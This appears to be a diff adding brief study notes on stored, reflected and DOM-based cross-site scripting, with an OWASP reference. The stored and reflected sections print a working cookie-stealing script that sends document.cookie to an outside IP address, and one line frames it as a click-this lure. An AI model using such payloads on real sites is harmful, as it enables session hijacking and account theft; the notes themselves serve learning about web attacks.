@@ -1,1 +1,23 @@
+#xss cross site scripting dom based reflected persistent serverside
+
+#Stored/persistent excerpt that could be used for comment board or something:
 <script>new Image().src="http://10.11.0.125/bogus.php?output="+document.cookie;</script>
+Victim browses to the site that has XSS stored on the server, and the javascript is executed in the BROWSER,
+and the cookie is transferred to the attacker from the Victim machine
+
+#Reflected:
+Attacker: "Here click on this:" http://something.com/somepage.php?id=<script>new Image().src="http://10.11.0.125/bogus.php?output="+document.cookie;</script>
+Then attacker has session ID. 
+
+#DOM-based:
+A little more complicated, kind of like a cross between the two. Server loads page for user, page has references to DOM elements
+not contained/passed to/associated with the server, and the URL can contain elements that modify that DOM element. 
+Reference: https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)
+
+DOM example Server Side Code:
+<script>
+document.write("Site is at: " + document.location.href + ".");
+</script>
+
+DOM example Request:
+GET http://someserver.com/somepage.php?id=whatever#<script>alert()</script>
